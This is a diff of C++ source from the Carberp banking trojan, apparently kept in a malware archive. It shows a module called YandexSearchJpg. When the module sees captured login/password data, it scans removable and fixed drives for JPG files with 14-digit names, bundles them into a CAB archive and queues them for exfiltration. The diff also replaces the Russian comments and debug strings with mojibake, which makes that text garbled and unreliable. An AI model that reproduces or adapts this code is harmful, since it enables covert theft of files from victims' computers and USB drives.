@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 
 #include "Modules.h"
 
@@ -22,7 +33,7 @@ namespace YandexSearchJpg
 	struct JpgCab
 	{
 		HCAB cab;
-		int count; //количество добавленных файлов
+		int count; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	};
 
 
@@ -32,11 +43,11 @@ namespace YandexSearchJpg
 		if( Search->nFileSizeLow > 80000 && Search->nFileSizeLow < 200000 )
 		{
 			int i = 0;
-			//считаем количество цифр в файле
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 			while( Search->cFileName[i] >= '0' && Search->cFileName[i] <= '9' ) i++;
 			if( i == 14  )
 			{
-				YADBG( "Yandex", "Нашли файл %s, %s", FileName, Search->cFileName );
+				YADBG( "Yandex", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ %s, %s", FileName, Search->cFileName );
 				AddFileToCab( jpgcab->cab, FileName, Search->cFileName );
 				jpgcab->count++;
 			}
@@ -46,7 +57,7 @@ namespace YandexSearchJpg
 
 	DWORD WINAPI StartSearch(void*)
 	{
-		YADBG( "Yandex", "Старт поиска" );
+		YADBG( "Yandex", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
 		DWORD drives = (DWORD)pGetLogicalDrives();
 		char drive[] = { 'C', ':', '\\', 0 };
 		char nameCab[MAX_PATH];
@@ -56,17 +67,17 @@ namespace YandexSearchJpg
 		jpgcab.count = 0;
 		if( jpgcab.cab != 0 )
 		{
-			//смотрим с последних дисков, так как там находятся флешки, чтобы успеть проверить до того как ее вытащат
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			for( int b = 31; b >= 2; b-- )
 			{
 				if( drives & (1 << b) )
 				{
 					drive[0] = 'A' + b;
 					int tp = (int)pGetDriveTypeA(drive);
-					//смотрим только флешки и жесткие диски
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 					if( tp == DRIVE_REMOVABLE || tp == DRIVE_FIXED )
 					{
-						YADBG( "Yandex", "Ищем на диске %s", drive );
+						YADBG( "Yandex", "пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ %s", drive );
 						SearchFiles( drive, "*.jpg", true, FA_ANY_FILES, (LPVOID)&jpgcab, FindJpg );
 					}
 				}
@@ -74,12 +85,12 @@ namespace YandexSearchJpg
 			CloseCab(jpgcab.cab);
 			if( jpgcab.count > 0 )
 			{
-				YADBG( "Yandex", "Найдено %d картинок", jpgcab.count );
+				YADBG( "Yandex", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅ %d пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ", jpgcab.count );
 				DataGrabber::SendCabDelayed( 0, nameCab, "yad" );
 			}
 			pDeleteFileA(nameCab);
 		}
-		YADBG( "Yandex", "Конец поиска" );
+		YADBG( "Yandex", "пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" );
 		return 0;
 	}
 
@@ -87,7 +98,7 @@ namespace YandexSearchJpg
 	{
 		if( WildCmp( (char*)e.data, "*login*passwd*" ) )
 		{
-			YADBG( "Yandex", "Запускаем поиск jpg файлов" );
+			YADBG( "Yandex", "пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ jpg пїЅпїЅпїЅпїЅпїЅпїЅ" );
 			MegaJump(StartSearch);
 		}
 	}
